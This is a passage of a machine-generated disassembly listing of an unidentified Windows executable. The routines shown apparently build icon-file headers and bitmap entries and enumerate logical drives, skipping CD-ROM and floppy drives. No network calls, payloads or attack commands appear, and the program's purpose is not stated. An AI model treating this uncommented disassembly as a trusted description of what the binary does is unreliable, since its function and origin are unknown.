sub_587C        proc near               ; CODE XREF: sub_5618+1F↑j
                                        ; sub_5618+30↑p
                cmp     dl, [eax+3Ch]
                jz      short locret_5889
                mov     [eax+3Ch], dl
                call    sub_567C

locret_5889:                            ; CODE XREF: sub_587C+3↑j
                retn
sub_587C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_588C        proc near               ; CODE XREF: sub_5618+D↑p
                push    ebx
                mov     ebx, eax
                cmp     byte ptr [ebx+3Ch], 1
                jz      short loc_589B
                cmp     dword ptr [ebx+41h], 0
                jnz     short loc_589F

loc_589B:                               ; CODE XREF: sub_588C+7↑j
                xor     eax, eax
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_589F:                               ; CODE XREF: sub_588C+D↑j
                mov     eax, [ebx+3Dh]
                movzx   eax, word ptr [eax+0Eh]
                call    sub_5398
                cmp     al, 4
                jnz     short loc_58BA
                mov     edx, [ebx+3Dh]
                cmp     dword ptr [edx+10h], 0
                jz      short loc_58BA
                mov     al, 5

loc_58BA:                               ; CODE XREF: sub_588C+21↑j
                                        ; sub_588C+2A↑j
                pop     ebx
                retn
sub_588C        endp


; =============== S U B R O U T I N E =======================================


sub_58BC        proc near               ; CODE XREF: sub_5424+3D↑p
                or      dword ptr [eax+52h], 0FFFFFFFFh
                xor     edx, edx
                xchg    edx, [eax+4Eh]
                xchg    eax, edx
                call    sub_3920
                retn
sub_58BC        endp


; =============== S U B R O U T I N E =======================================


sub_58CC        proc near               ; CODE XREF: sub_65D0+166↓p
                mov     edx, ds:404468h
                xor     eax, eax
                call    sub_38F8
                mov     dword ptr [eax+18h], 20h ; ' '
                retn
sub_58CC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_58E4        proc near               ; CODE XREF: CODE:00005901↓p
                                        ; sub_5920+10↓p ...
                xor     ecx, ecx
                xchg    ecx, [eax+1Ch]
                jecxz   short loc_58F9
                cmp     byte ptr [eax+20h], 0
                jnz     short loc_58F9
                push    eax
                push    ecx
                call    sub_3568
                pop     eax

loc_58F9:                               ; CODE XREF: sub_58E4+5↑j
                                        ; sub_58E4+B↑j
                mov     byte ptr [eax+20h], 0
                retn
sub_58E4        endp

; ---------------------------------------------------------------------------
                align 10h
                push    eax
                call    sub_58E4
                pop     eax
                call    sub_392C
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5910        proc near               ; CODE XREF: sub_65D0+17D↓p
                push    eax
                mov     eax, esp
                mov     ecx, edx
                xor     edx, edx
                call    sub_5F48
                pop     eax
                retn
sub_5910        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5920        proc near               ; CODE XREF: sub_60A8+2C↓p

var_28          = byte ptr -28h
var_24          = dword ptr -24h
var_20          = byte ptr -20h
var_1C          = dword ptr -1Ch

                push    ebx
                push    esi
                add     esp, 0FFFFFFD4h
                mov     esi, edx
                mov     ebx, eax
                cmp     esi, [ebx+1Ch]
                jz      short loc_5979
                mov     eax, ebx
                call    sub_58E4
                mov     eax, esi
                mov     [ebx+1Ch], eax
                test    esi, esi
                jz      short loc_5979
                push    esp
                push    eax
                call    sub_3580
                lea     eax, [esp+34h+var_20]
                push    eax
                push    18h
                mov     eax, dword ptr [esp+3Ch+var_28]
                push    eax
                call    sub_3538
                mov     eax, [esp+34h+var_1C]
                mov     [ebx+18h], eax
                mov     eax, dword ptr [esp+34h+var_28]
                test    eax, eax
                jz      short loc_596B
                push    eax
                call    sub_3528

loc_596B:                               ; CODE XREF: sub_5920+43↑j
                mov     eax, [esp+34h+var_24]
                test    eax, eax
                jz      short loc_5979
                push    eax
                call    sub_3528

loc_5979:                               ; CODE XREF: sub_5920+C↑j
                                        ; sub_5920+1C↑j ...
                add     esp, 2Ch
                pop     esi
                pop     ebx
                retn
sub_5920        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5980        proc near               ; CODE XREF: sub_59CC+30↓p
                                        ; sub_5A38+2E2↓p
                push    ebx
                mov     edx, 409194h

loc_5986:                               ; CODE XREF: sub_5980+13↓j
                movzx   ecx, byte ptr [edx]
                jecxz   short loc_5995
                inc     edx
                xor     ebx, ebx
                inc     ebx
                shl     ebx, cl
                cmp     ebx, eax
                jl      short loc_5986

loc_5995:                               ; CODE XREF: sub_5980+9↑j
                xchg    eax, ecx
                pop     ebx
                retn
sub_5980        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_5998        proc near               ; CODE XREF: sub_5A38+1EE↓p

arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                xor     eax, eax
                mov     edx, [ebp+arg_0]
                mov     dl, [edx-0Eh]
                cmp     dl, 2
                jnb     short loc_59B1
                mov     ecx, [ebp+arg_0]
                cmp     byte ptr [ecx-0Dh], 1
                jnz     short loc_59C7

loc_59B1:                               ; CODE XREF: sub_5998+E↑j
                mov     eax, [ebp+arg_0]
                xor     eax, eax
                mov     al, dl
                mov     edx, [ebp+arg_0]
                movzx   edx, byte ptr [edx-0Dh]
                shl     edx, 8
                add     eax, edx
                shl     eax, 2

loc_59C7:                               ; CODE XREF: sub_5998+17↑j
                pop     ebp
                retn
sub_5998        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_59CC        proc near               ; CODE XREF: sub_5A38+1E5↓p
                                        ; sub_5A38+2F8↓p ...

arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                mov     eax, [ebp+arg_0]
                mov     al, [eax-0Eh]
                cmp     al, 2
                jnb     short loc_59E8
                mov     edx, [ebp+arg_0]
                cmp     byte ptr [edx-0Dh], 1
                jnz     short loc_5A03

loc_59E8:                               ; CODE XREF: sub_59CC+11↑j
                mov     edx, [ebp+arg_0]
                and     eax, 0FFh
                mov     edx, [ebp+arg_0]
                movzx   edx, byte ptr [edx-0Dh]
                shl     edx, 8
                add     eax, edx
                call    sub_5980
                jmp     short loc_5A0A
; ---------------------------------------------------------------------------

loc_5A03:                               ; CODE XREF: sub_59CC+1A↑j
                mov     eax, [ebp+arg_0]
                movzx   eax, word ptr [eax-0Ah]

loc_5A0A:                               ; CODE XREF: sub_59CC+35↑j
                imul    ebx
                add     eax, 1Fh
                test    eax, eax
                jns     short loc_5A16
                add     eax, 1Fh

loc_5A16:                               ; CODE XREF: sub_59CC+45↑j
                sar     eax, 5
                shl     eax, 2
                imul    esi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_59CC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5A24        proc near               ; CODE XREF: sub_5A38+1FD↓p
                                        ; sub_5A38+306↓p ...
                add     eax, 1Fh
                test    eax, eax
                jns     short loc_5A2E
                add     eax, 1Fh

loc_5A2E:                               ; CODE XREF: sub_5A24+5↑j
                sar     eax, 5
                shl     eax, 2
                imul    edx
                retn
sub_5A24        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_5A38        proc near               ; CODE XREF: sub_5F48+EE↓p

var_8C          = byte ptr -8Ch
var_88          = dword ptr -88h
var_84          = dword ptr -84h
var_7C          = word ptr -7Ch
var_7A          = word ptr -7Ah
var_74          = dword ptr -74h
var_70          = dword ptr -70h
var_6C          = dword ptr -6Ch
var_68          = word ptr -68h
var_66          = word ptr -66h
var_60          = dword ptr -60h
var_4C          = dword ptr -4Ch
var_48          = dword ptr -48h
var_44          = dword ptr -44h
var_40          = dword ptr -40h
var_3A          = word ptr -3Ah
var_38          = word ptr -38h
var_36          = word ptr -36h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_1D          = byte ptr -1Dh
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = byte ptr -10h
var_F           = byte ptr -0Fh
var_E           = byte ptr -0Eh
var_D           = byte ptr -0Dh
var_A           = word ptr -0Ah
var_8           = dword ptr -8
var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFF74h
                push    ebx
                push    esi
                push    edi
                mov     [ebp+var_1C], ecx
                mov     [ebp+var_18], edx
                mov     [ebp+var_14], eax
                mov     [ebp+var_1D], 0
                mov     [ebp+var_3A], 0
                mov     [ebp+var_38], 1
                mov     eax, [ebp+var_18]
                inc     eax
                sar     eax, 1
                jns     short loc_5A68
                adc     eax, 0

loc_5A68:                               ; CODE XREF: sub_5A38+2B↑j
                mov     [ebp+var_36], ax
                lea     edx, [ebp+var_3A]
                mov     eax, [ebp+var_1C]
                mov     ecx, 6
                call    sub_4D8C
                cmp     eax, 6
                jnz     loc_5F1C
                movzx   eax, [ebp+var_36]
                shl     eax, 4
                add     eax, 6
                mov     [ebp+var_28], eax
                call    sub_396C
                mov     [ebp+var_40], eax
                xor     edx, edx
                xor     eax, eax
                call    sub_53D8
                mov     [ebp+var_30], eax
                xor     edx, edx
                xor     eax, eax
                call    sub_53D8
                mov     [ebp+var_34], eax
                xor     ecx, ecx
                push    ebp
                push    406B11h
                push    dword ptr fs:[ecx]
                mov     fs:[ecx], esp
                mov     eax, [ebp+var_18]
                shr     eax, 1
                test    eax, eax
                jl      loc_5C77
                inc     eax
                mov     [ebp+var_44], eax
                mov     eax, [ebp+var_14]
                mov     [ebp+var_48], eax

loc_5AD7:                               ; CODE XREF: sub_5A38+239↓j
                mov     eax, [ebp+var_48]
                mov     edi, [eax]
                mov     eax, [ebp+var_48]
                mov     eax, [eax+4]
                mov     [ebp+var_2C], eax
                test    edi, edi
                jnz     short loc_5AF3
                cmp     [ebp+var_2C], 0
                jz      loc_5C77

loc_5AF3:                               ; CODE XREF: sub_5A38+AF↑j
                lea     eax, [ebp+var_8C]
                push    eax
                push    18h
                mov     eax, [ebp+var_2C]
                push    eax
                call    sub_3538
                mov     ebx, [ebp+var_88]
                mov     esi, [ebp+var_84]
                test    edi, edi
                jz      short loc_5B24
                lea     eax, [ebp+var_8C]
                push    eax
                push    18h
                push    edi
                call    sub_3538

loc_5B24:                               ; CODE XREF: sub_5A38+DB↑j
                lea     eax, [ebp+var_10]
                xor     ecx, ecx
                mov     edx, 10h
                call    sub_1A60
                mov     [ebp+var_10], bl
                mov     eax, esi
                mov     [ebp+var_F], al
                test    edi, edi
                jnz     short loc_5B48
                mov     [ebp+var_E], 2
                jmp     loc_5C01
; ---------------------------------------------------------------------------

loc_5B48:                               ; CODE XREF: sub_5A38+105↑j
                push    2000h
                push    esi
                push    ebx
                push    0
                push    edi
                call    sub_3560
                mov     edx, eax
                mov     eax, [ebp+var_30]
                call    sub_55E0
                lea     eax, [ebp+var_74]
                xor     ecx, ecx
                mov     edx, 28h ; '('
                call    sub_1A60
                mov     [ebp+var_74], 28h ; '('
                lea     eax, [ebp+var_8C]
                push    eax
                push    18h
                mov     eax, [ebp+var_30]
                call    sub_5554
                push    eax
                call    sub_3538
                mov     ax, [ebp+var_7C]
                cmp     ax, 1
                jnz     short loc_5BB1
                cmp     [ebp+var_7A], 0Fh
                jb      short loc_5BB1
                mov     [ebp+var_E], 0
                mov     [ebp+var_D], 0
                mov     ax, [ebp+var_7A]
                mov     [ebp+var_A], ax
                jmp     short loc_5C01
; ---------------------------------------------------------------------------

loc_5BB1:                               ; CODE XREF: sub_5A38+15E↑j
                                        ; sub_5A38+165↑j
                mov     cx, [ebp+var_7A]
                mov     edx, 1
                shl     edx, cl
                movzx   eax, ax
                imul    edx, eax
                cmp     edx, 10h
                jnb     short loc_5BD7
                mov     eax, [ebp+var_30]
                mov     dl, 1
                call    sub_5618
                mov     [ebp+var_E], 2
                jmp     short loc_5C01
; ---------------------------------------------------------------------------

loc_5BD7:                               ; CODE XREF: sub_5A38+18D↑j
                cmp     edx, 100h
                jnb     short loc_5BEF
                mov     eax, [ebp+var_30]
                mov     dl, 2
                call    sub_5618
                mov     [ebp+var_E], 10h
                jmp     short loc_5C01
; ---------------------------------------------------------------------------

loc_5BEF:                               ; CODE XREF: sub_5A38+1A5↑j
                mov     eax, [ebp+var_30]
                mov     dl, 3
                call    sub_5618
                mov     [ebp+var_E], 0
                mov     [ebp+var_D], 1

loc_5C01:                               ; CODE XREF: sub_5A38+10B↑j
                                        ; sub_5A38+177↑j ...
                xor     edx, edx
                mov     dl, [ebp+var_E]
                xor     eax, eax
                mov     al, [ebp+var_D]
                shl     eax, 8
                add     edx, eax
                mov     eax, [ebp+var_40]
                call    sub_39E8
                push    ebp
                mov     edx, esi
                mov     eax, ebx
                call    sub_59CC
                pop     ecx
                mov     edi, eax
                push    ebp
                call    sub_5998
                pop     ecx
                add     eax, 28h ; '('
                add     edi, eax
                mov     edx, esi
                mov     eax, ebx
                call    sub_5A24
                add     edi, eax
                mov     [ebp+var_8], edi
                mov     eax, [ebp+var_28]
                mov     [ebp+var_4], eax
                lea     edx, [ebp+var_10]
                mov     eax, [ebp+var_1C]
                mov     ecx, 10h
                call    sub_4D8C
                cmp     eax, 10h
                jz      short loc_5C64
                call    sub_1FEC
                jmp     loc_5F1C
; ---------------------------------------------------------------------------

loc_5C64:                               ; CODE XREF: sub_5A38+220↑j
                mov     eax, [ebp+var_8]
                add     [ebp+var_28], eax
                add     [ebp+var_48], 8
                dec     [ebp+var_44]
                jnz     loc_5AD7

loc_5C77:                               ; CODE XREF: sub_5A38+8F↑j
                                        ; sub_5A38+B5↑j
                mov     eax, [ebp+var_18]
                shr     eax, 1
                test    eax, eax
                jl      loc_5EEB
                inc     eax
                mov     [ebp+var_44], eax
                mov     [ebp+var_24], 0
                mov     eax, [ebp+var_14]
                mov     [ebp+var_4C], eax

loc_5C95:                               ; CODE XREF: sub_5A38+4AD↓j
                mov     eax, [ebp+var_4C]
                mov     edi, [eax]
                mov     eax, [ebp+var_4C]
                mov     eax, [eax+4]
                mov     [ebp+var_2C], eax
                test    edi, edi
                jnz     short loc_5CB1
                cmp     [ebp+var_2C], 0
                jz      loc_5EEB

loc_5CB1:                               ; CODE XREF: sub_5A38+26D↑j
                lea     eax, [ebp+var_8C]
                push    eax
                push    18h
                mov     eax, [ebp+var_2C]
                push    eax
                call    sub_3538
                mov     ebx, [ebp+var_88]
                mov     esi, [ebp+var_84]
                lea     eax, [ebp+var_74]
                xor     ecx, ecx
                mov     edx, 28h ; '('
                call    sub_1A60
                mov     [ebp+var_74], 28h ; '('
                mov     [ebp+var_70], ebx
                mov     [ebp+var_6C], esi
                test    edi, edi
                jz      short loc_5CF6
                mov     eax, ebx
                add     eax, eax
                mov     [ebp+var_6C], eax

loc_5CF6:                               ; CODE XREF: sub_5A38+2B5↑j
                mov     [ebp+var_68], 1
                mov     eax, [ebp+var_40]
                mov     edx, [ebp+var_24]
                call    sub_3A5C
                lea     edx, [ebp+var_E]
                mov     [edx], ax
                cmp     [ebp+var_A], 0
                jnz     short loc_5D23
                lea     eax, [ebp+var_E]
                movzx   eax, word ptr [eax]
                call    sub_5980
                mov     [ebp+var_A], ax

loc_5D23:                               ; CODE XREF: sub_5A38+2DA↑j
                mov     ax, [ebp+var_A]
                mov     [ebp+var_66], ax
                push    ebp
                mov     edx, esi
                mov     eax, ebx
                call    sub_59CC
                pop     ecx
                add     eax, 28h ; '('
                push    eax
                mov     edx, esi
                mov     eax, ebx
                call    sub_5A24
                pop     edx
                add     edx, eax
                mov     [ebp+var_60], edx
                lea     edx, [ebp+var_74]
                mov     eax, [ebp+var_1C]
                mov     ecx, 28h ; '('
                call    sub_4D8C
                cmp     eax, 28h ; '('
                jz      short loc_5D68
                call    sub_1FEC
                jmp     loc_5F1C
; ---------------------------------------------------------------------------

loc_5D68:                               ; CODE XREF: sub_5A38+324↑j
                test    edi, edi
                jz      loc_5DF4
                push    0
                push    esi
                push    ebx
                push    0
                push    edi
                call    sub_3560
                mov     edx, eax
                mov     eax, [ebp+var_30]
                call    sub_55E0
                movzx   eax, [ebp+var_66]
                cmp     eax, 10h
                jg      short loc_5DA0
                jz      short loc_5DD0
                dec     eax
                jz      short loc_5DAC
                sub     eax, 3
                jz      short loc_5DB8
                sub     eax, 4
                jz      short loc_5DC4
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DA0:                               ; CODE XREF: sub_5A38+355↑j
                sub     eax, 18h
                jz      short loc_5DDC
                sub     eax, 8
                jz      short loc_5DE8
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DAC:                               ; CODE XREF: sub_5A38+35A↑j
                mov     eax, [ebp+var_30]
                mov     dl, 1
                call    sub_5618
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DB8:                               ; CODE XREF: sub_5A38+35F↑j
                mov     eax, [ebp+var_30]
                mov     dl, 2
                call    sub_5618
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DC4:                               ; CODE XREF: sub_5A38+364↑j
                mov     eax, [ebp+var_30]
                mov     dl, 3
                call    sub_5618
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DD0:                               ; CODE XREF: sub_5A38+357↑j
                mov     eax, [ebp+var_30]
                mov     dl, 5
                call    sub_5618
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DDC:                               ; CODE XREF: sub_5A38+36B↑j
                mov     eax, [ebp+var_30]
                mov     dl, 6
                call    sub_5618
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DE8:                               ; CODE XREF: sub_5A38+370↑j
                mov     eax, [ebp+var_30]
                mov     dl, 7
                call    sub_5618
                jmp     short loc_5E17
; ---------------------------------------------------------------------------

loc_5DF4:                               ; CODE XREF: sub_5A38+332↑j
                push    0
                push    esi
                push    ebx
                push    0
                mov     eax, [ebp+var_2C]
                push    eax
                call    sub_3560
                mov     edx, eax
                mov     eax, [ebp+var_30]
                call    sub_55E0
                mov     eax, [ebp+var_30]
                mov     dl, 1
                call    sub_5618

loc_5E17:                               ; CODE XREF: sub_5A38+366↑j
                                        ; sub_5A38+372↑j ...
                mov     eax, [ebp+var_30]
                cmp     dword ptr [eax+41h], 0
                jz      short loc_5E89
                lea     eax, [ebp+var_E]
                movzx   eax, word ptr [eax]
                mov     ecx, eax
                shl     ecx, 2
                mov     eax, [ebp+var_30]
                mov     edx, [eax+3Dh]
                add     edx, 28h ; '('
                mov     eax, [ebp+var_1C]
                call    sub_4D8C
                lea     edx, [ebp+var_E]
                movzx   edx, word ptr [edx]
                shl     edx, 2
                cmp     eax, edx
                jz      short loc_5E53
                call    sub_1FEC
                jmp     loc_5F1C
; ---------------------------------------------------------------------------

loc_5E53:                               ; CODE XREF: sub_5A38+40F↑j
                push    ebp
                mov     edx, esi
                mov     eax, ebx
                call    sub_59CC
                pop     ecx
                mov     ecx, eax
                mov     eax, [ebp+var_30]
                mov     edx, [eax+41h]
                mov     eax, [ebp+var_1C]
                call    sub_4D8C
                mov     edi, eax
                push    ebp
                mov     edx, esi
                mov     eax, ebx
                call    sub_59CC
                pop     ecx
                cmp     edi, eax
                jz      short loc_5E89
                call    sub_1FEC
                jmp     loc_5F1C
; ---------------------------------------------------------------------------

loc_5E89:                               ; CODE XREF: sub_5A38+3E6↑j
                                        ; sub_5A38+445↑j
                push    0
                push    esi
                push    ebx
                push    0
                mov     eax, [ebp+var_2C]
                push    eax
                call    sub_3560
                mov     edx, eax
                mov     eax, [ebp+var_34]
                call    sub_55E0
                mov     eax, [ebp+var_34]
                mov     dl, 1
                call    sub_5618
                mov     edx, esi
                mov     eax, ebx
                call    sub_5A24
                mov     ecx, eax
                mov     eax, [ebp+var_34]
                mov     edx, [eax+41h]
                mov     eax, [ebp+var_1C]
                call    sub_4D8C
                mov     edi, eax
                mov     edx, esi
                mov     eax, ebx
                call    sub_5A24
                cmp     edi, eax
                jz      short loc_5EDB
                call    sub_1FEC
                jmp     short loc_5F1C
; ---------------------------------------------------------------------------

loc_5EDB:                               ; CODE XREF: sub_5A38+49A↑j
                inc     [ebp+var_24]
                add     [ebp+var_4C], 8
                dec     [ebp+var_44]
                jnz     loc_5C95

loc_5EEB:                               ; CODE XREF: sub_5A38+246↑j
                                        ; sub_5A38+273↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406B18h

loc_5EF8:                               ; CODE XREF: sub_5A38+4DE↓j
                mov     eax, [ebp+var_40]
                call    sub_3920
                mov     eax, [ebp+var_30]
                call    sub_3920
                mov     eax, [ebp+var_34]
                call    sub_3920
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_5EF8
; ---------------------------------------------------------------------------
                mov     [ebp+var_1D], 1

loc_5F1C:                               ; CODE XREF: sub_5A38+47↑j
                                        ; sub_5A38+227↑j ...
                mov     al, [ebp+var_1D]
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_5A38        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 4
                dd 406B2Ch, 342E0311h, 433h, 0
                dd 300h, 403FC800h, 4F4B0300h, 408D4Ch

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_5F48        proc near               ; CODE XREF: sub_5910+7↑p

var_2C          = byte ptr -2Ch
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFD4h
                push    ebx
                push    esi
                push    edi
                xor     ebx, ebx
                mov     [ebp+var_18], ebx
                mov     [ebp+var_C], ecx
                mov     [ebp+var_8], edx
                mov     [ebp+var_4], eax
                xor     eax, eax
                push    ebp
                push    406C97h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     esi, [ebp+var_8]
                test    esi, esi
                jl      short loc_5FBC
                inc     esi
                mov     [ebp+var_10], 0
                mov     eax, [ebp+var_4]

loc_5F7F:                               ; CODE XREF: sub_5F48+72↓j
                mov     edx, [eax]
                cmp     dword ptr [edx+1Ch], 0
                jz      loc_607B
                mov     edx, [ebp+var_10]
                inc     edx
                mov     ecx, [ebp+var_8]
                sub     ecx, edx
                jl      short loc_5FB3
                inc     ecx
                mov     ebx, [ebp+var_4]
                lea     edx, [ebx+edx*4]

loc_5F9D:                               ; CODE XREF: sub_5F48+69↓j
                mov     ebx, [eax]
                mov     ebx, [ebx+18h]
                mov     edi, [edx]
                cmp     ebx, [edi+18h]
                jz      loc_607B
                add     edx, 4
                dec     ecx
                jnz     short loc_5F9D

loc_5FB3:                               ; CODE XREF: sub_5F48+4C↑j
                inc     [ebp+var_10]
                add     eax, 4
                dec     esi
                jnz     short loc_5F7F

loc_5FBC:                               ; CODE XREF: sub_5F48+2A↑j
                mov     eax, [ebp+var_C]
                call    sub_4D68
                mov     [ebp+var_14], eax
                mov     eax, [ebp+var_8]
                inc     eax
                add     eax, eax
                push    eax
                lea     eax, [ebp+var_18]
                mov     ecx, 1
                mov     edx, ds:406B28h
                call    sub_2F24
                add     esp, 4
                mov     esi, [ebp+var_8]
                test    esi, esi
                jl      short loc_6026
                inc     esi
                mov     [ebp+var_10], 0
                mov     ebx, [ebp+var_4]

loc_5FF6:                               ; CODE XREF: sub_5F48+DC↓j
                lea     eax, [ebp+var_2C]
                push    eax
                mov     eax, [ebx]
                mov     eax, [eax+1Ch]
                push    eax
                call    sub_3580
                mov     eax, [ebp+var_10]
                add     eax, eax
                mov     edx, [ebp+var_18]
                mov     ecx, [ebp+var_1C]
                mov     [edx+eax*4], ecx
                mov     edx, [ebp+var_18]
                mov     ecx, [ebp+var_20]
                mov     [edx+eax*4+4], ecx
                inc     [ebp+var_10]
                add     ebx, 4
                dec     esi
                jnz     short loc_5FF6

loc_6026:                               ; CODE XREF: sub_5F48+A1↑j
                mov     eax, [ebp+var_18]
                call    sub_2D70
                mov     edx, eax
                mov     ecx, [ebp+var_C]
                mov     eax, [ebp+var_18]
                call    sub_5A38
                test    al, al
                jnz     short loc_604C
                mov     eax, [ebp+var_C]
                xor     ecx, ecx
                mov     edx, [ebp+var_14]
                call    sub_4D90

loc_604C:                               ; CODE XREF: sub_5F48+F5↑j
                mov     eax, [ebp+var_18]
                call    sub_2D70
                mov     esi, eax
                test    esi, esi
                jl      short loc_607B
                inc     esi
                mov     [ebp+var_10], 0

loc_6062:                               ; CODE XREF: sub_5F48+131↓j
                mov     eax, [ebp+var_18]
                mov     edx, [ebp+var_10]
                mov     eax, [eax+edx*4]
                test    eax, eax
                jz      short loc_6075
                push    eax
                call    sub_3528

loc_6075:                               ; CODE XREF: sub_5F48+125↑j
                inc     [ebp+var_10]
                dec     esi
                jnz     short loc_6062

loc_607B:                               ; CODE XREF: sub_5F48+3D↑j
                                        ; sub_5F48+5F↑j ...
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406C9Eh

loc_6088:                               ; CODE XREF: CODE:0000609C↓j
                lea     eax, [ebp+var_18]
                mov     edx, ds:406B28h
                call    sub_2F30
                retn
sub_5F48        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6088
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_60A8        proc near               ; CODE XREF: sub_65D0+174↓p
                push    ebx
                push    esi
                push    edi
                mov     edi, ecx
                mov     esi, edx
                mov     ebx, eax
                mov     eax, ebx
                call    sub_58E4
                push    edi
                mov     eax, esi
                call    sub_280C
                push    eax
                mov     eax, ds:40A650h
                push    eax
                call    sub_3648
                cmp     eax, 1
                jle     short loc_60D9
                mov     edx, ebx
                xchg    eax, edx
                call    sub_5920

loc_60D9:                               ; CODE XREF: sub_60A8+27↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_60A8        endp

; ---------------------------------------------------------------------------
                align 10h
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    406D2Fh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A68Ch
                jnz     short loc_6121
                cmp     dword ptr ds:40A690h, 0
                jz      short loc_610D
                mov     eax, ds:40A690h
                push    eax
                call    sub_3458

loc_610D:                               ; CODE XREF: CODE:00006100↑j
                mov     eax, 4090E8h
                call    sub_2494
                mov     eax, 4090E4h
                call    sub_2494

loc_6121:                               ; CODE XREF: CODE:000060F7↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406D36h

loc_612E:                               ; CODE XREF: CODE:00006134↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_612E
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                sub     dword ptr ds:40A68Ch, 1
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6140        proc near               ; CODE XREF: sub_699C+58↓p

var_9C          = dword ptr -9Ch
var_97          = byte ptr -97h

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFF64h
                push    ebx
                push    esi
                push    edi
                xor     edx, edx
                mov     [ebp+var_9C], edx
                mov     edi, eax
                xor     eax, eax
                push    ebp
                push    406DFCh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_97]
                push    eax
                push    97h
                call    sub_3490
                xor     ebx, ebx
                jmp     short loc_61D5
; ---------------------------------------------------------------------------

loc_6179:                               ; CODE XREF: sub_6140+A1↓j
                mov     esi, ebx
                and     esi, 0FFh
                lea     eax, [ebp+esi+var_97]
                push    eax
                call    sub_3468
                sub     eax, 5
                jz      short loc_61D2
                mov     al, [ebp+esi+var_97]
                call    sub_198C
                cmp     al, 41h ; 'A'
                jz      short loc_61D2
                mov     al, [ebp+esi+var_97]
                call    sub_198C
                cmp     al, 42h ; 'B'
                jz      short loc_61D2
                lea     eax, [ebp+var_9C]
                mov     dl, [ebp+esi+var_97]
                call    sub_25B4
                mov     edx, [ebp+var_9C]
                mov     eax, edi
                call    sub_2614

loc_61D2:                               ; CODE XREF: sub_6140+51↑j
                                        ; sub_6140+61↑j ...
                add     bl, 4

loc_61D5:                               ; CODE XREF: sub_6140+37↑j
                xor     eax, eax
                mov     al, bl
                cmp     [ebp+eax+var_97], 0
                jnz     short loc_6179
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406E03h

loc_61F0:                               ; CODE XREF: CODE:00006201↓j
                lea     eax, [ebp+var_9C]
                call    sub_2494
                retn
sub_6140        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_61F0
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_620C        proc near               ; CODE XREF: sub_699C:loc_6A36↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = qword ptr -8

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF0h
                xor     eax, eax
                mov     [ebp+var_C], eax
                mov     [ebp+var_10], eax
                xor     eax, eax
                push    ebp
                push    406E88h
